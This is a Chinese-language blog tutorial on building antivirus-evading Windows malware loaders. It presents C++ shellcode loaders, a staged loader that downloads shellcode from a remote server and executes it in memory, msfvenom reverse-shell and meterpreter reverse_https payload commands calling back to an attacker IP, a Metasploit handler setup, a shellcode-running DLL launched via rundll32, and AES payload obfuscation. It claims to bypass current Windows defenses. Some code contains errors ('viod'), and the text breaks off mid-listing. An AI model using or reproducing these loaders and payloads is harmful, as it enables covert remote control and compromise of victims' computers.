![在这里插入图片描述](https://img-blog.csdnimg.cn/1893a5acbac04c53aea168670a9e28e0.png)

# 环境安装
c++编译环境
```
apt-get install g++-mingw-w64-x86-64
```
## 简单的演示
一串简单的将shellcode加载入windows内存执行的c++代码
```
#include <windows.h>
#include <stdio.h>

int main() {

	unsigned char payload[] = "\x00";


	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	
	MoveMemory(alloc_mem, payload, sizeof(payload));

	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);

	return 0;
}

```
## 解释：
payload变量里存储的就是我们的shellcode
代码：
```
LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```
作用：
```
这行代码是使用Windows操作系统提供的函数在进程的虚拟内存空间中分配内存块

LPVOID alloc_mem: 这是一个指向void类型的指针，用于存储分配的内存块的起始地址。
LPVOID是Windows API中表示内存地址的通用类型

VirtualAlloc: 这是Windows操作系统提供的函数，用于在进程的虚拟内存空间中分配内存。它接受四个参数：

NULL: 这表示希望操作系统自动选择一个合适的地址来分配内存块。
sizeof(payload): 这是要分配的内存块的大小，sizeof(payload)表示要分配的大小与名为payload的变量或数据结构的大小相等。
MEM_COMMIT | MEM_RESERVE: 这是内存分配的标志位，它们告诉操作系统将分配的内存块同时提交（即立即分配物理内存）和保留（即为该内存块保留虚拟地址空间）。
PAGE_READWRITE: 这是指定内存块的访问权限，PAGE_READWRITE表示内存块可以被读写
```

代码：
```
if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
```
作用：
```
if (!alloc_mem): 这是一个条件语句，它判断alloc_mem指针是否为NULL，即是否分配内存失败。
在C语言中，如果指针为NULL，表示内存分配失败或者指向的内存块不存在

printf("Failed to Allocate memory (%u)\n", GetLastError());: 如果内存分配失败，该语句将打印一条错误消息。
GetLastError()是一个Windows API函数，用于获取最近一次系统调用的错误代码

return -1;: 如果内存分配失败，代码将返回-1
```

代码：
```
MoveMemory(alloc_mem, payload, sizeof(payload));
```
解释：
```
MoveMemory 函数，它的作用是将指定源内存块的内容复制到目标内存块

MoveMemory(alloc_mem, payload, sizeof(payload));: 这是一个函数调用
它将源内存块 payload 的内容复制到目标内存块 alloc_mem 中，复制的字节数为 sizeof(payload)。

alloc_mem: 这是目标内存块的起始地址，是之前通过 VirtualAlloc 分配的内存块的地址。
payload: 这是源内存块的起始地址，通常表示一段数据或者缓冲区的地址。
sizeof(payload): 这表示要复制的字节数，即从源内存块复制多少字节的数据
```

代码：
```
DWORD oldProtect;
```
作用：
```
DWORD oldProtect; 是一个变量声明，它用于存储先前的内存保护标志位（Protection Flags）。
在Windows操作系统中，内存保护标志位用于控制对内存页的访问权限
```

代码：
```
if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}
```
作用：
```
VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect): 
这是一个函数调用，它使用 VirtualProtect 函数来修改内存保护标志位，从而更改内存块的访问权限。

alloc_mem: 这是之前通过 VirtualAlloc 分配的内存块的起始地址。
sizeof(payload): 这表示要更改保护标志位的内存块的大小，通常等于 payload 数据的大小。
PAGE_EXECUTE_READ: 这是新的内存保护标志位，表示内存块可以被执行和读取。这是一种常见的内存保护配置，用于存储可执行代码。
&oldProtect: 这是一个指向 DWORD 类型的指针，用于存储先前的内存保护标志位。
if (!VirtualProtect(...)) { ... }: 这是一个条件语句，它检查 VirtualProtect 函数是否成功执行。如果函数执行失败，即无法更改内存保护标志位，那么条件为真。

printf("Failed to change memory protection (%u)\n", GetLastError());: 如果内存保护更改失败，将输出错误消息，其中包含通过 GetLastError() 获取的错误代码。

return -2;: 在内存保护更改失败的情况下，代码将返回一个表示错误的返回码 -2
```

代码：
```
HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}
```
作用：
```
HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);: 
这是一个函数调用，用于创建一个新的线程。

NULL: 这是一个表示线程的安全性的参数，NULL 表示线程将继承父进程的安全性设置。
0: 这是初始线程栈大小（以字节为单位），0 表示使用默认的线程栈大小。

(LPTHREAD_START_ROUTINE)alloc_mem: 这是一个指向函数的指针，用于指定新线程将要执行的函数。
在这里，它使用了先前分配的内存块的起始地址 alloc_mem，意味着新线程将从这个内存地址开始执行代码。

NULL: 这是传递给线程函数的参数，这里设置为 NULL。
0: 这是控制线程的创建标志，0 表示创建线程后立即启动。

NULL: 这是线程的标识符，NULL 表示不获取线程标识符。
if (!tHandle) { ... }: 这是一个条件语句，它检查 CreateThread 函数是否成功创建新的线程。如果函数执行失败，即无法创建线程，那么条件为真。

printf("Failed to Create the thread (%u)\n", GetLastError());: 如果线程创建失败，将输出错误消息，其中包含通过 GetLastError() 获取的错误代码。

return -3;: 在线程创建失败的情况下，代码将返回一个表示错误的返回码 -3
```

代码：
```
printf("\n\nalloc_mem : %p\n", alloc_mem);
WaitForSingleObject(tHandle, INFINITE);
```
作用：
```
printf("\n\nalloc_mem : %p\n", alloc_mem);: 这是一个 printf 函数调用，它用于在控制台输出信息。具体来说，它会输出分配的内存块的地址。

\n\n: 这是换行符，用于在输出之前在控制台输出两个空行，以提高可读性。
alloc_mem: 这是之前通过 VirtualAlloc 分配的内存块的起始地址。
%p: 这是 printf 的格式化占位符，用于输出指针的值。
WaitForSingleObject(tHandle, INFINITE);: 这是一个函数调用，它用于等待一个线程的执行完成。

tHandle: 这是先前创建的线程的句柄，表示要等待的线程。
INFINITE: 这是一个常量，表示等待时间无限。这意味着程序将一直等待，直到指定的线程执行完毕
```

这就是一个简单的将shellcode加载进windows内存里执行的程序代码
## 编译
如果要编译，可以使用这个命令
```
x86_64-w64-mingw32-g++ --static muma.cpp -o muma.exe
```
这个程序没有经过免杀，所以很容易被杀

# 分离免杀
以下程序的免杀方式是用socket函数远程获取shellcode执行，不是将shellcode写入到源文件里，这是一种免杀方式
代码：
```
#include <windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096

void power(char* host, char* port, char* resource) {

    DWORD oldp = 0;
    BOOL returnValue;

    size_t origsize = strlen(host) + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t Whost[newsize];
    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);


    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    char sendbuf[MAX_PATH] = "";
    lstrcatA(sendbuf, "GET /");
    lstrcatA(sendbuf, resource);

    char recvbuf[DEFAULT_BUFLEN];
    memset(recvbuf, 0, DEFAULT_BUFLEN);
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        return ;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        return ;
    }


    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return ;
        }


        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return ;
    }

    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }

    
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }
    

    do {

        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("[+] Received %d Bytes\n", iResult);
        else if (iResult == 0)
            printf("[+] Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());


        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	
	MoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));

	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Fai1led to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);

	return 0;

    } while (iResult > 0);

    closesocket(ConnectSocket);
    WSACleanup();
}

int main(int argc, char** argv) {

    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
        return 1;
    }

    power(argv[1], argv[2], argv[3]);

    return 0;

}
```
简而言之，这些代码的作用就是使用socket函数远程获取shellcode文件，然后加载到内存里
编译文件：
```
x86_64-w64-mingw32-g++ --static -o power.exe muma.cpp -fpermissive -lws2_32
```
然后把程序放到靶机上
```
 scp kali@192.168.0.110:/home/kali/bypass/power.exe .
```
![image.png](https://img-blog.csdnimg.cn/img_convert/87ee5b851d3f3832c3b6236cf72a0192.png#averageHue=#161616&clientId=ufbb5d8d0-1aae-4&from=paste&height=114&id=u5502d574&originHeight=103&originWidth=868&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=10854&status=done&style=none&taskId=u958e954b-fc1f-465a-bec5-648ac173a75&title=&width=964.4444699934978)
回到kali，启用http服务
```
python -m http.server
```
![image.png](https://img-blog.csdnimg.cn/img_convert/9b30d7a69a20e933d9c8824c5d688a73.png#averageHue=#080605&clientId=ufbb5d8d0-1aae-4&from=paste&height=150&id=u0bc5a830&originHeight=135&originWidth=903&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=35909&status=done&style=none&taskId=u6c7ea274-3d89-4312-90e8-845f36449ee&title=&width=1003.3333599125905)
生成一个shellcode
```
msfvenom -p  windows/x64/shell_reverse_tcp lhost=192.168.0.110 lport=1234 -f raw > beacon.bin
```
![image.png](https://img-blog.csdnimg.cn/img_convert/24f9f5a33dd5ea4b99c593d5ac4e0f76.png#averageHue=#060504&clientId=ufbb5d8d0-1aae-4&from=paste&height=626&id=u128e8714&originHeight=563&originWidth=1197&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=166080&status=done&style=none&taskId=ub75dda6f-6491-4147-85ec-476b707c6aa&title=&width=1330.0000352329687)
然后监听设置的端口
```
nc -nvlp 1234
```
使用方法：
```
power.exe 服务器ip 端口 要加载的shellcode文件名
```
![image.png](https://img-blog.csdnimg.cn/img_convert/e7be68ca447f48984373eef1c7e3da44.png#averageHue=#131313&clientId=ufbb5d8d0-1aae-4&from=paste&height=152&id=ue56827f7&originHeight=137&originWidth=831&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=12190&status=done&style=none&taskId=u489688cc-6bde-41fe-9895-0d14604ef61&title=&width=923.3333577933141)
效果：
![image.png](https://img-blog.csdnimg.cn/img_convert/12d2a7caa38fc6500050781afb62670a.png#averageHue=#040303&clientId=ufbb5d8d0-1aae-4&from=paste&height=867&id=ua76009fc&originHeight=780&originWidth=1356&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=200458&status=done&style=none&taskId=u6ff03c11-439d-481a-8030-2860d70ca87&title=&width=1506.666706579704)
能动态和静态过最新的windows防火墙
文件被查杀要随便改一下源代码然后再编译一下就好了
![image.png](https://img-blog.csdnimg.cn/img_convert/359bb29b2025f25268e9a59398384ffa.png#averageHue=#181b1c&clientId=ufbb5d8d0-1aae-4&from=paste&height=508&id=ude2c9121&originHeight=457&originWidth=1770&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=61830&status=done&style=none&taskId=u366d2ecd-6c21-4767-8c38-963b28b61a4&title=&width=1966.6667187655428)

## https证书
如果要使用msfconsole，需要用到windows/x64/meterpreter/reverse_https模块，首先我们需要生成一个https证书
```
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
rm -f www.example.com.key  www.example.com.crt
```
![image.png](https://img-blog.csdnimg.cn/img_convert/99d582dc4b1de7f2324a573d5e76f3ca.png#averageHue=#070605&clientId=ufbb5d8d0-1aae-4&from=paste&height=547&id=ube66945c&originHeight=492&originWidth=1616&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=137679&status=done&style=none&taskId=u9cd98d13-c745-4219-9977-6a76143df8c&title=&width=1795.5556031215351)
然后生成一个木马
```
msfvenom -p  windows/x64/meterpreter/reverse_https lhost=192.168.0.110 lport=1234 HandlerSSLCert=/home/kali/bypass/www.example.com.pem StagerVerifySSLCert=true -f raw > beacon.bin
```
![image.png](https://img-blog.csdnimg.cn/img_convert/d0576315c759787c684d7bd58c12d55f.png#averageHue=#070504&clientId=ufbb5d8d0-1aae-4&from=paste&height=208&id=u6c4e9357&originHeight=187&originWidth=1703&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=76730&status=done&style=none&taskId=u7b473c7b-4e53-4fe5-a1f2-13fdad588ad&title=&width=1892.222272348994)
打开msf
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.0.110
set lport 1234
set HandlerSSLCert /home/kali/bypass/www.example.com.pem
set StagerverifySSLCert true
run
```
回到靶机，获取程序
![image.png](https://img-blog.csdnimg.cn/img_convert/d01166b143c9060c2110f74df61ef900.png#averageHue=#151515&clientId=ufbb5d8d0-1aae-4&from=paste&height=220&id=u0fd378a0&originHeight=198&originWidth=1116&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=26944&status=done&style=none&taskId=ub812fa20-39cb-4ae1-a218-37135668993&title=&width=1240.000032848783)
然后得到shell
![image.png](https://img-blog.csdnimg.cn/img_convert/c979059922ce5ea0edb4eddb3828fcab.png#averageHue=#080605&clientId=ufbb5d8d0-1aae-4&from=paste&height=321&id=u4f5cdfff&originHeight=289&originWidth=1638&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=137244&status=done&style=none&taskId=u13f9d081-5388-4b7d-a27d-d7b43c597d7&title=&width=1820.0000482135363)
能动态和静态过最新的windows防火墙
# dll注入
一个常见的弹窗dll的c++代码：
```
#include <windows.h>

#pragma comment (lib, "user32.lib")

BOOL APIENTRY DLLMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){

    switch (ul_reason_for_call){
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C"{
__declspec(dllexport) BOOL WINAPI HelloWorld(void){

    MessageBox(NULL, "Welcome", "Security", MB_OK);
    return TRUE;
    }
}
```
## 编译
```
x86_64-w64-mingw32-g++ --shared muma.cpp -o muma.dll
```
![image.png](https://img-blog.csdnimg.cn/img_convert/895f7911a8fc97b2583e8f36b0e014c1.png#averageHue=#050608&clientId=u722c5723-9e25-4&from=paste&height=303&id=u962db4ed&originHeight=273&originWidth=633&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=37878&status=done&style=none&taskId=ufe051c51-03d4-44fa-88fa-46fcf2927a5&title=&width=703.3333519653042)
把dll转移到靶机上
```
scp kali@192.168.0.110:/home/kali/bypass/muma.dll .
```
![image.png](https://img-blog.csdnimg.cn/img_convert/2f41a4d4c9fcd6f23b07532b6c4c0301.png#averageHue=#111111&clientId=u722c5723-9e25-4&from=paste&height=419&id=u39a890e3&originHeight=377&originWidth=1073&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=31791&status=done&style=none&taskId=ue5be06a9-efc8-4d54-9802-b688f8c5765&title=&width=1192.222253805326)
执行命令运行dll文件
```
rundll32.exe .\muma.dll, HelloWorld
```
HelloWorld是执行这里的代码
![image.png](https://img-blog.csdnimg.cn/img_convert/4a90cbbda33d6fa991badf9593abd094.png#averageHue=#181a1b&clientId=u722c5723-9e25-4&from=paste&height=147&id=u32e9da59&originHeight=132&originWidth=606&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=7835&status=done&style=none&taskId=uc20c0102-b746-4144-9e2e-96e96e00e01&title=&width=673.3333511705756)
![image.png](https://img-blog.csdnimg.cn/img_convert/550a86567b407b80ba6a188a285fb91a.png#averageHue=#a79563&clientId=u722c5723-9e25-4&from=paste&height=181&id=u82383714&originHeight=163&originWidth=154&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=5509&status=done&style=none&taskId=ub86481f4-45ff-4ff8-ad21-541115e6e8f&title=&width=171.11111564400767)
这就是一个常见的弹窗dll
然后可以使用上面的那个将shellcode加载入windows内存里执行的代码来配合
```
unsigned char payload[] = "\x00";


    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!alloc_mem) {
        printf("Failed to Allocate memory (%u)\n", GetLastError());
        return -1;
    }
    
    MoveMemory(alloc_mem, payload, sizeof(payload));

    DWORD oldProtect;

    if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection (%u)\n", GetLastError());
        return -2;
    }


    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\n", GetLastError());
        return -3;
    }

    printf("\n\nalloc_mem : %p\n", alloc_mem);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;


    return TRUE;
    }
}
```
完整版：
```
#include <windows.h>
#include <stdio.h>

#pragma comment (lib, "user32.lib")

BOOL APIENTRY DLLMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){

    switch (ul_reason_for_call){
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C"{
__declspec(dllexport) BOOL WINAPI HelloWorld(void){

    MessageBox(NULL, "Welcome", "Security", MB_OK);

    unsigned char payload[] = "\x00";


    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!alloc_mem) {
        printf("Failed to Allocate memory (%u)\n", GetLastError());
        return -1;
    }
    
    MoveMemory(alloc_mem, payload, sizeof(payload));

    DWORD oldProtect;

    if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection (%u)\n", GetLastError());
        return -2;
    }


    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\n", GetLastError());
        return -3;
    }

    printf("\n\nalloc_mem : %p\n", alloc_mem);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;


    return TRUE;
    }
}
```
这里没写入shellcode，因为要对shellcode进行混淆
## AES混淆
AES加密脚本：
```
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}
```
完整版：
```
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#pragma comment (lib, "crypt32.lib")

#pragma comment (lib, "user32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

BOOL APIENTRY DLLMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){

    switch (ul_reason_for_call){
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C"{
__declspec(dllexport) BOOL WINAPI HelloWorld(viod){

    MessageBox(NULL, "Welcome", "Security", MB_OK);
    unsigned char AESkey[] = {};
    unsigned char payload[] = {};

    DWORD payload_length = sizeof(payload);

    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!alloc_mem) {
        printf("Failed to Allocate memory (%u)\n", GetLastError());
        return -1;
    }
    
    DecryptAES((char*)payload, payload_length, AESkey, sizeof(AESkey));
    MoveMemory(alloc_mem, payload, sizeof(payload));

    DWORD oldProtect;

    if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection (%u)\n", GetLastError());
        return -2;
    }


    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\n", GetLastError());
        return -3;
    }

    printf("\n\nalloc_mem : %p\n", alloc_mem);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;


    return TRUE;
    }
}
```
然后还需要写一个python脚本来打印出aes加密后的payload和aes解密的密钥
```
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib

def AESencrypt(plaintext, key):
    k = hashlib.sha256(KEY).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext,key

  
def printResult(key, ciphertext):
    print('char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
    print('unsigned char payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
    
try:
    file = open(sys.argv[1], "rb")
    content = file.read()
except:
    print("Usage: .\AES_cryptor.py PAYLOAD_FILE")
    sys.exit()


KEY = urandom(16)
ciphertext, key = AESencrypt(content, KEY)

printResult(KEY,ciphertext)
```
使用msf生成一个payload
```
msfvenom -p  windows/x64/shell_reverse_tcp lhost=192.168.0.110 lport=1234 -f raw > beacon.bin
```
然后用aes脚本加密payload
```
pip3 install pycryptodome
python3 aes.py beacon.bin
```
![image.png](https://img-blog.csdnimg.cn/img_convert/a19a4f808afb63223f1c8df7c7c0893b.png#averageHue=#0f0c09&clientId=u722c5723-9e25-4&from=paste&height=413&id=ue229e2f7&originHeight=413&originWidth=1920&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=192440&status=done&style=none&taskId=u5898e422-1c84-49b0-b73b-5c29ae0670f&title=&width=1920)
将shellcode放入脚本里
完整版：
```
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#pragma comment (lib, "crypt32.lib")

#pragma comment (lib, "user32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

BOOL APIENTRY DLLMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){

    switch (ul_reason_for_call){
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C"{
__declspec(dllexport) BOOL WINAPI HelloWorld(void){

    MessageBox(NULL, "Welcome", "Security", MB_OK);
    
    unsigned char AESkey[] = { 0x30, 0xe2, 0xd, 0xa2, 0xff, 0x83, 0xe7, 0xef, 0x48, 0xf5, 0x17, 0xe2, 0x51, 0x9c, 0x53, 0xde };
